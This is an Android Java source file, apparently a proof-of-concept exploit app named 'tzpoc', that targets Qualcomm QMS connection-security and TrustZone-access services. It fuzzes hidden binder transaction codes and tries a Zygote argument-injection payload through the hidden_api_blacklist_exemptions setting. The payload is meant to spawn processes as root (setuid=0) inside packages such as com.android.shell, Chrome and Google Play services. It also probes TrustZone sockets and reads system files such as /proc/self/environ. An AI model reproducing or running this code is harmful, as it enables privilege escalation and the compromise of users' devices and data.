package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IServiceManager mServiceManager;
    private IBinder mTZServiceBinder;
    private boolean isBoundCS = false;
    private boolean isBoundTZ = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection csConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("CS Service bound");
            if (mTZServiceBinder != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mServiceManager = null;
            isBoundCS = false;
            enableButtons(true, false);
            updateStatus("CS disconnected");
        }
    };

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZServiceBinder = service;
            appendLog("TZ Service bound");
            if (mServiceManager != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZServiceBinder = null;
            isBoundTZ = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindServices();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindServices() {
        try {
            Intent intentCS = new Intent();
            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
            isBoundCS = bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundCS) appendLog("CS bind failed");

            Intent intentTZ = new Intent();
            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            isBoundTZ = bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundTZ) appendLog("TZ bind failed");

            if (!isBoundCS && !isBoundTZ) {
                appendLog("Failed to bind any service");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        appendLog("========== PHASE 1: CS Service Enumeration ==========");
        if (mServiceManager != null) {
            IBinder rticBinder = getService("rtic");
            if (rticBinder != null) {
                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
                testRticFlags(rtic);
                discoverMethods(rticBinder, "IRticService");
            }
            IBinder tlocBinder = getService("tloc");
            if (tlocBinder != null) {
                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                testTloc(tloc);
                discoverMethods(tlocBinder, "ITlocService");
                // 追加: 隠しメソッド (code 2) のテスト
                testTlocHiddenMethod(tlocBinder);
            }
        }

        appendLog("========== PHASE 2: Zygote Injection via WRITE_SECURE_SETTINGS ==========");
        testZygoteInjection();

        appendLog("========== PHASE 3: TZAccess Socket Connect ==========");
        if (mTZServiceBinder != null) {
            tryConnectViaTZ("/dev/socket/minksocket");
            tryConnectViaTZ("/dev/socket/ssgqmig");
        }

        appendLog("========== PHASE 4: File System Exploration ==========");
        exploreFiles();

        appendLog("========== PHASE 5: Settings Manipulation ==========");
        testSettingsWrite();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got " + serviceName + " binder, status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testRticFlags(IRticService rtic) {
        appendLog("--- Testing RTIC with different flags ---");
        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
        for (long flag : flags) {
            try {
                int[] status = new int[1];
                int[] ret = new int[1];
                byte[] data = rtic.getRticData(flag, status, ret, false);
                appendLog("Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            } catch (RemoteException e) {
                appendLog("RemoteException for flag " + flag + ": " + e.getMessage());
            }
        }
        // フォーマット指定
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = rtic.getRticData(0, status, ret, true);
            appendLog("z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTloc(ITlocService tloc) {
        appendLog("--- Testing ITlocService ---");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            int warmup = tloc.tlocWarmUp();
            appendLog("tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTlocHiddenMethod(IBinder binder) {
        appendLog("--- Testing hidden method (code 2) of ITlocService ---");
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(binder.getInterfaceDescriptor());
            // 適当なデータを書き込んでみる
            data.writeInt(123);
            data.writeString("test");
            boolean success = binder.transact(2, data, reply, 0);
            if (success) {
                appendLog("Hidden method call succeeded, reply size=" + reply.dataSize());
                reply.setDataPosition(0);
                try {
                    int result = reply.readInt();
                    appendLog("  readInt: " + result);
                } catch (Exception e) {}
                try {
                    String s = reply.readString();
                    appendLog("  readString: " + s);
                } catch (Exception e) {}
            } else {
                appendLog("Hidden method call failed");
            }
        } catch (Exception e) {
            appendLog("Hidden method error: " + e.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void discoverMethods(IBinder binder, String name) {
        appendLog("--- Discovering hidden methods for " + name + " ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                } else {
                    appendLog("Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void testZygoteInjection() {
        appendLog("--- Zygote injection via hidden_api_blacklist_exemptions ---");
        String[] targets = {
            "com.android.shell",
            "com.android.systemui",
            "com.android.settings",
            "com.android.chrome",
            "com.android.vending",
            "com.google.android.gms"
        };
        for (String pkg : targets) {
            if (stopRequested.get()) break;
            appendLog("Trying package: " + pkg);
            try {
                String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
                StringBuilder payload = new StringBuilder();
                for (int i = 0; i < 8000; i++) payload.append('A');
                payload.append("9\n");
                payload.append("--runtime-args\n");
                payload.append("--setuid=0\n");
                payload.append("--setgid=0\n");
                payload.append("--target-sdk-version=29\n");
                payload.append("--nice-name=root_" + pkg.replace(".", "_") + "\n");
                payload.append("--app-data-dir=/data/data/" + pkg + "\n");
                payload.append("--package-name=" + pkg + "\n");
                payload.append("android.app.ActivityThread\n");
                payload.append(",,,X");

                String malicious = payload.toString();
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", malicious);
                String oldPolicy = Settings.Global.getString(getContentResolver(), "hidden_api_policy");
                Settings.Global.putString(getContentResolver(), "hidden_api_policy", "1");
                Settings.Global.putString(getContentResolver(), "hidden_api_policy", oldPolicy != null ? oldPolicy : "");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
                appendLog("  Injected for " + pkg + " (restored)");
                Thread.sleep(500);
            } catch (Exception e) {
                appendLog("  Error for " + pkg + ": " + e.getMessage());
            }
        }
    }

    private void tryConnectViaTZ(String path) {
        appendLog("Trying TZAccess connect to " + path);
        if (mTZServiceBinder == null) {
            appendLog("  TZ binder null");
            return;
        }
        try {
            // IMinkSocketFd クラスを直接インポートして使う（AIDL がコンパイルされていれば）
            Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd");
            Method asInterface = cls.getMethod("asInterface", IBinder.class);
            Object proxy = asInterface.invoke(null, mTZServiceBinder);
            Method aMethod = cls.getMethod("a", String.class, int[].class);
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
            if (pfd != null) {
                appendLog("  Got FD: " + iArr[0] + " for " + path);
                pfd.close();
            } else {
                appendLog("  Failed to get FD for " + path);
            }
        } catch (ClassNotFoundException e) {
            appendLog("  IMinkSocketFd class not found. Ensure AIDL is included.");
        } catch (Exception e) {
            appendLog("  TZ connect error: " + e.getMessage());
        }
    }

    private void exploreFiles() {
        appendLog("--- File System Exploration ---");
        // 読み取り可能な proc ファイル
        String[] procFiles = {
            "/proc/self/status",
            "/proc/self/stat",
            "/proc/self/environ",
            "/proc/mounts",
            "/proc/net/dev",
            "/proc/cmdline",
            "/proc/version",
            "/proc/uptime",
            "/proc/loadavg",
            "/proc/meminfo",
            "/proc/cpuinfo"
        };
        for (String path : procFiles) {
            if (stopRequested.get()) break;
            readFileContent(path);
        }

        // /data ディレクトリの読み取り（通常はアクセスできないが試す）
        File dataDir = new File("/data");
        if (dataDir.exists() && dataDir.canRead()) {
            appendLog("Can read /data/");
            File[] children = dataDir.listFiles();
            if (children != null) {
                for (File f : children) {
                    appendLog("  " + f.getName());
                }
            }
        } else {
            appendLog("Cannot read /data/ (permission denied)");
        }

        // /dev ディレクトリ（通常は読み取り可能だがファイル一覧は取れない場合あり）
        File devDir = new File("/dev");
        if (devDir.exists() && devDir.canRead()) {
            appendLog("Can read /dev/");
            File[] children = devDir.listFiles();
            if (children != null) {
                for (File f : children) {
                    appendLog("  " + f.getName());
                }
            }
        } else {
            appendLog("Cannot read /dev/");
        }

        // /data/local/tmp は書き込み可能か？
        File tmpDir = new File("/data/local/tmp");
        if (tmpDir.exists()) {
            appendLog("tmp exists, canWrite=" + tmpDir.canWrite() + ", canRead=" + tmpDir.canRead());
            File[] children = tmpDir.listFiles();
            if (children != null) {
                for (File f : children) {
                    appendLog("  " + f.getName());
                }
            }
        } else {
            appendLog("/data/local/tmp not exists");
        }
    }

    private void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists() || !f.canRead()) {
            appendLog("Cannot read " + path);
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[4096];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("Content of " + path + ": " + content);
            } else {
                appendLog("Empty file: " + path);
            }
        } catch (Exception e) {
            appendLog("Error reading " + path + ": " + e.getMessage());
        }
    }

    private void testSettingsWrite() {
        appendLog("--- Settings Write ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded!");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("Settings error: " + e.getMessage());
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "final_evolved_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Final Evolved PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBoundCS) unbindService(csConnection);
        if (isBoundTZ) unbindService(tzConnection);
        saveLog();
    }
}
